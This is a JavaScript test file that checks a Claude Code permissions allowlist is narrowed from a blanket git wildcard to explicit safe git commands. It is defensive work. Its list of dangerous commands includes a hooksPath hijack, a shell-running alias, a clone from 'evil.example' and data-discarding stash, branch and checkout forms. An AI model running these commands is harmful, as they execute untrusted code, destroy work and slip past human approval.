/**
 * P5.2 regression — Bash(git *) auto-approve narrowing.
 *
 * BUG (pre-fix): permissions.allow shipped a bare "Bash(git *)" wildcard, which
 * auto-approves EVERY git subcommand — including dangerous alias/config forms
 * like `git -c core.hooksPath=/tmp ...`, `git config ...`, and `git clone ...`.
 * A `git -c` or alias can run arbitrary code, so a blanket git wildcard is an
 * auto-approval footgun.
 *
 * FIX: replace the single "Bash(git *)" with an EXPLICIT safe-verb allowlist.
 * The dangerous forms (`git -c`, `git config`, `git clone`) match no explicit
 * entry and therefore fall through to a permission prompt.
 *
 * FAILING-BEFORE / PASSING-AFTER: pre-fix "Bash(git *)" is present and matches
 * all three dangerous commands → assertions (a)/(c) FAIL; post-fix it is gone
 * and the 15 explicit safe verbs are present → assertions PASS.
 *
 * WI-15 W2: checkout/stash/branch wildcards were narrowed to their safe forms
 * (18 entries). The discard forms now fall through to a prompt, and the
 * bash-guard evaluator asks for them in every permission mode.
 */

import { describe, it, expect } from 'vitest';
import { readFileSync } from 'fs';
import { join } from 'path';

const SETTINGS_PATH = join(process.cwd(), '.claude', 'settings.json');
const FULL_SETTINGS_PATH = join(process.cwd(), '.claude', 'settings.full.json');

const EXPECTED_SAFE_GIT_ALLOW = [
  'Bash(git status)',
  'Bash(git diff:*)',
  'Bash(git log:*)',
  'Bash(git show:*)',
  'Bash(git add:*)',
  'Bash(git commit:*)',
  'Bash(git push)',
  'Bash(git branch)',
  'Bash(git branch --list:*)',
  'Bash(git branch --show-current)',
  'Bash(git checkout -b:*)',
  'Bash(git checkout main)',
  'Bash(git merge:*)',
  'Bash(git stash list)',
  'Bash(git stash push:*)',
  'Bash(git rev-parse:*)',
  'Bash(git ls-files:*)',
  'Bash(git check-ignore:*)',
];

// Dangerous git command strings that MUST NOT be auto-approved by any allow entry.
const DANGEROUS_GIT_COMMANDS = [
  'git -c core.hooksPath=/tmp/evil commit -m x',
  'git config --global alias.pwn "!sh -c evil"',
  'git clone https://evil.example/repo.git',
  // WI-15 W2: discard forms that the old checkout/stash/branch wildcards pre-approved.
  'git checkout -- .',
  'git checkout .',
  'git stash drop',
  'git stash clear',
  'git branch -D feature',
];

/**
 * Approximate Claude Code's Bash(...) permission-pattern matching well enough to
 * assert that NO safe-git allow entry auto-approves a dangerous command.
 *   "Bash(git status)"      -> exact match on "git status"
 *   "Bash(git commit:*)"    -> prefix match: command starts with "git commit"
 *   "Bash(git *)"           -> prefix match on "git " (the old, over-broad form)
 */
function bashPatternMatches(pattern, cmd) {
  const m = /^Bash\((.*)\)$/.exec(pattern);
  if (!m) return false;
  const inner = m[1];
  if (inner.endsWith(':*')) {
    return cmd.startsWith(inner.slice(0, -2));
  }
  if (inner.includes('*')) {
    // e.g. "git *" -> everything up to the first "*" is the literal prefix.
    return cmd.startsWith(inner.replace(/\*.*$/, ''));
  }
  return cmd === inner;
}

describe('.claude/settings.json — git allowlist narrowing (P5.2)', () => {
  const settings = JSON.parse(readFileSync(SETTINGS_PATH, 'utf8'));
  const allow = (settings.permissions && settings.permissions.allow) || [];

  it('(a) does NOT ship a bare "Bash(git *)" wildcard', () => {
    expect(allow).not.toContain('Bash(git *)');
  });

  it('(a2) does NOT ship a bare "Bash(git:*)" wildcard', () => {
    expect(allow).not.toContain('Bash(git:*)');
  });

  it('(b) contains all 18 explicit safe-git allow entries', () => {
    for (const entry of EXPECTED_SAFE_GIT_ALLOW) {
      expect(allow).toContain(entry);
    }
  });

  it('(c) no allow entry auto-approves git -c / config / clone or a W2 discard form', () => {
    for (const cmd of DANGEROUS_GIT_COMMANDS) {
      const matching = allow.filter((p) => bashPatternMatches(p, cmd));
      expect(matching, `command "${cmd}" auto-approved by ${JSON.stringify(matching)}`).toEqual([]);
    }
  });

  it('(c2) explicitly bans the known catch-all git patterns', () => {
    for (const banned of ['Bash(git *)', 'Bash(git:*)', 'Bash(git -c:*)', 'Bash(git config:*)', 'Bash(git clone:*)',
      'Bash(git checkout:*)', 'Bash(git stash:*)', 'Bash(git branch:*)', 'Bash(git restore:*)']) {
      expect(allow).not.toContain(banned);
    }
  });

  it('(d) still auto-approves the workflow verbs the pipeline needs (checkout/merge/branch)', () => {
    // The parent /act loop must keep auto-approving these to land the commit.
    expect(allow.some((p) => bashPatternMatches(p, 'git checkout -b feature'))).toBe(true);
    expect(allow.some((p) => bashPatternMatches(p, 'git merge --no-ff feature'))).toBe(true);
    expect(allow.some((p) => bashPatternMatches(p, 'git branch'))).toBe(true);
    expect(allow.some((p) => bashPatternMatches(p, 'git checkout main'))).toBe(true);
    expect(allow.some((p) => bashPatternMatches(p, 'git stash push -m wip'))).toBe(true);
    expect(allow.some((p) => bashPatternMatches(p, 'git commit -m x'))).toBe(true);
    expect(allow.some((p) => bashPatternMatches(p, 'git push'))).toBe(true);
  });
});

describe('.claude/settings.full.json — same git allowlist narrowing (P5.2)', () => {
  const full = JSON.parse(readFileSync(FULL_SETTINGS_PATH, 'utf8'));
  const allow = (full.permissions && full.permissions.allow) || [];

  it('does NOT ship a bare "Bash(git *)" wildcard', () => {
    expect(allow).not.toContain('Bash(git *)');
  });

  it('contains all 18 explicit safe-git allow entries', () => {
    for (const entry of EXPECTED_SAFE_GIT_ALLOW) {
      expect(allow).toContain(entry);
    }
  });

  it('no allow entry auto-approves git -c / config / clone or a W2 discard form', () => {
    for (const cmd of DANGEROUS_GIT_COMMANDS) {
      const matching = allow.filter((p) => bashPatternMatches(p, cmd));
      expect(matching, `command "${cmd}" auto-approved by ${JSON.stringify(matching)}`).toEqual([]);
    }
  });
});
